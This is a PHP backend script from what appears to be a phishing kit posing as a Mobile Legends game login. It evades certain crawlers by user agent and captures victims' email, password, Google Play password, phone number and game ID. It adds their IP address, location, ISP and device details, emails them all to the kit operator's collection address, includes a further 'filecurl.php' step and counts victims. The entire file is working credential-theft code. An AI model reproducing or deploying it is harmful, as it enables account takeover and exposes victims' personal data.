<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/lenzzip.php';
include 'system/device.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$level = $_POST['level'];
$phone = $_POST['phone'];
$playid = $_POST['playid'];
$login = $_POST['login'];
$pass = $_POST['pass'];
$server = $_POST['server'];

$deviceInfo = $infos['platfrm_name'];
$osVersionInfo = $infos['platfrm_vers'];
$browserInfo = $infos['browser_name'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $level == "" && $playid == "" && $phone == "" && $pass == "" && $server == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$lenzz_flag | +$lenzz_callcode | ML Level $level | Login $login | $email";
$pesan = '
<center>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="0">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>Info Login '.$login.'</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>EMAIL</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$email.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PASSWORD</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$password.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PASSWORD GP</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$pass.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PHONE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$phone.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LEVEL</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$level.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>GAME ID</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$playid.' ('.$server.')</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LOGIN</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$login.'</strong></th>
</tr>
</table>
<table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>Device Information</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>DEVICE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$deviceInfo.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>OS VERSION</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$osVersionInfo.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>BROWSER</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$browserInfo.'</strong></th>
</tr>
</table>
<table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>Additional Information</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>IP ADDRESS</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_ipaddress.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>COUNTRY</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_country.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PROVINCE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_regionName.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>CITY</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_city.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>TIME ZONE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_timezone.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>ISP INFO</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_isp.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>ENTRY TIME</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$jamasuk.'</strong></th>
</tr>
</table>
<table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>© CAHYO SR II</strong></th>
</tr>
</table>
</div>
</div>
</td>
</tr>
</tbody>
</table>
</center>
';
}
// Get Today Date
$Tget = file_get_contents("system/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('system/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("system/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('system/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("system/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('system/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("system/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama_result'].' <admin@putranesia.com>' . "\r\n";

if(mail($resultData['email_result'], $subjek, $pesan, $headers))
include 'filecurl.php';

{
$upGet = file_get_contents("system/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('system/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}
?>